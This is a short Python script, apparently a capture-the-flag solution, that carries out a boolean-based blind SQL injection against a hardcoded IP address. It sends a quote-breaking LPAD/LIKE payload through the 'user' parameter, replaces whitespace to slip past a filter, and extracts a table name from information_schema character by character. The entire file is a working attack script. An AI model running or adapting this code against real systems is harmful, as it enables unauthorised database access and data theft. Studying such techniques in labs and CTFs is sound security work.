#encoding=utf8
import requests, re

sql = "select table_name from information_schema.tables limit 60,1"  #WEEK44SQLIII    FLLLLLAG


sql = re.subn('\s',chr(10),sql)[0]
hex_range = [i for i in range(130) if i!=37 and i!=95]
evalstr = ''
strlist = []

for str_len in range(1,20):
	for i in hex_range:
		if str_len == 1:
			params={"user":r"a\'or(Lpad(({}),1,1)like({}))#".format(sql,hex(i))}
			r = requests.get("http://118.25.18.223:10088/index.php",params=params)
			if r.text[:5] == 'admin':
				strlist.append(i)
				break
		else:
			params={"user":r"a\'or(Lpad(({}),{},1)like({}))#".format(sql,str_len,hex_str+hex(i)[2:])}
			r = requests.get("http://118.25.18.223:10088/index.php",params=params)
			if r.text[:5] == 'admin':
				strlist.append(i)
				break	

	for x,i in enumerate(strlist):
		if x==0:
			evalstr = "hex({})".format(i)
		else:
			evalstr += "+hex({})[2:]".format(i)

	hex_str = eval(evalstr)


	for i in strlist:
		print(chr(i),end="")
	print()

	print(strlist)

